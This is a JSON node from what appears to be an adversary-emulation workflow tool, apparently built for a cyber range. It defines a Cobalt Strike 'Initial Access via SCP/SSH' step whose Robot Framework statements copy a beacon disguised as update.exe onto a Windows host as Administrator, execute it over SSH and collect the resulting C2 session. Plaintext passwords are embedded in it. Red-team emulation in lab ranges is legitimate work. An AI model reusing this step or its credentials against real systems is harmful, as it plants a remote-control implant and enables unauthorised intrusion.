    {
      "id": "cs-initial-access-1775769139864",
      "type": "opforNode",
      "position": {
        "x": -750,
        "y": -165
      },
      "data": {
        "definition": {
          "id": "cs-initial-access",
          "name": "Initial Access via SCP/SSH",
          "icon": "\ud83d\udeaa",
          "tactic": "TA0001",
          "category": "Cobalt Strike",
          "subcategory": "",
          "description": "Copy beacon payload to target via SCP then execute via SSH to establish initial foothold",
          "riskLevel": "medium",
          "estimatedDuration": 30,
          "inputs": [
            {
              "id": "payload_ready",
              "label": "Payload Ready",
              "type": "boolean",
              "required": true
            },
            {
              "id": "signal",
              "label": "Signal",
              "type": "signal",
              "required": false
            }
          ],
          "outputs": [
            {
              "id": "session",
              "label": "Initial Beacon",
              "type": "session",
              "description": "First beacon from target"
            }
          ],
          "parameters": [
            {
              "id": "targetIp",
              "label": "Target IP",
              "type": "string",
              "required": true,
              "placeholder": "172.16.2.5",
              "default": "172.16.2.5"
            },
            {
              "id": "targetUser",
              "label": "Target User",
              "type": "string",
              "required": true,
              "placeholder": "Administrator",
              "default": "Administrator"
            },
            {
              "id": "targetPass",
              "label": "Target Pass",
              "type": "string",
              "required": true,
              "placeholder": "P@ssw0rd",
              "default": "P@ssw0rd"
            },
            {
              "id": "targetPath",
              "label": "Target Drop Path",
              "type": "string",
              "required": false,
              "placeholder": "C:/Users/Administrator/Downloads",
              "default": "C:/Users/Administrator/Downloads"
            },
            {
              "id": "beaconWait",
              "label": "Beacon Wait (seconds)",
              "type": "number",
              "required": false,
              "placeholder": "15",
              "default": 15
            }
          ],
          "executionType": "cobalt_strike",
          "requirements": {
            "c2Server": true,
            "listeners": [
              "HTTP"
            ],
            "payloads": [
              "update"
            ],
            "libraries": [
              "cobaltstrikec2/cobaltstrike.py",
              "SSHLibrary",
              "SCPLibrary"
            ]
          },
          "robotFramework": {
            "keyword": "Start Command",
            "libraries": [
              "cobaltstrikec2/cobaltstrike.py",
              "SSHLibrary",
              "SCPLibrary"
            ],
            "variables": [
              {
                "name": "TARGET1",
                "fromParam": "targetIp",
                "scope": "suite"
              },
              {
                "name": "TARGET1_USER",
                "fromParam": "targetUser",
                "scope": "suite"
              },
              {
                "name": "TARGET1_PASS",
                "fromParam": "targetPass",
                "scope": "suite"
              },
              {
                "name": "TARGET1_DROP_PATH",
                "fromParam": "targetPath",
                "default": "C:/Users/Administrator/Downloads",
                "scope": "suite"
              },
              {
                "name": "BEACON_WAIT",
                "fromParam": "beaconWait",
                "default": "15",
                "scope": "suite"
              }
            ],
            "preKeywordLog": "=== Initial Access \u2192 ${TARGET1} ===",
            "preKeywordStatements": [
              "${LOCAL_INITIAL_BEACON}=    Set Variable    ${WORKDIR}update.exe",
              "SCPLibrary.Open Connection    ${TARGET1}    username=${TARGET1_USER}    password=${TARGET1_PASS}",
              "SCPLibrary.Put File    ${LOCAL_INITIAL_BEACON}    ${TARGET1_DROP_PATH}/update.exe",
              "SCPLibrary.Close Connection",
              "Sleep    5s",
              "SSHLibrary.Open Connection    ${TARGET1}",
              "Login    ${TARGET1_USER}    ${TARGET1_PASS}",
              "Sleep    1s"
            ],
            "keywordArgs": [
              {
                "staticValue": "${TARGET1_DROP_PATH}\\\\update.exe",
                "position": 1
              }
            ],
            "postKeywordStatements": [
              "SSHLibrary.Close Connection",
              "Sleep    ${BEACON_WAIT}s",
              "@{_sessions}=    Get Sessions By IP    ${TARGET1}",
              "${CURRENT_SESSION}=    Set Variable    ${_sessions[0]}"
            ],
            "sessionVariable": "CURRENT_SESSION",
            "documentation": "SCP payload to target and execute via SSH",
            "tags": [
              "initial-access",
              "ssh"
            ]
          }
        },
        "parameters": {
          "targetIp": "10.10.104.34",
          "targetUser": "Administrator",
          "targetPass": "Simspace1!Simspace1!",
          "targetPath": "C:/Users/Administrator/Downloads",
          "beaconWait": 15
        },
        "label": "Initial Access via SCP/SSH",
        "validationState": "validated"
      },
      "measured": {
        "width": 160,
        "height": 103
      },
      "selected": false,
      "dragging": false
    },
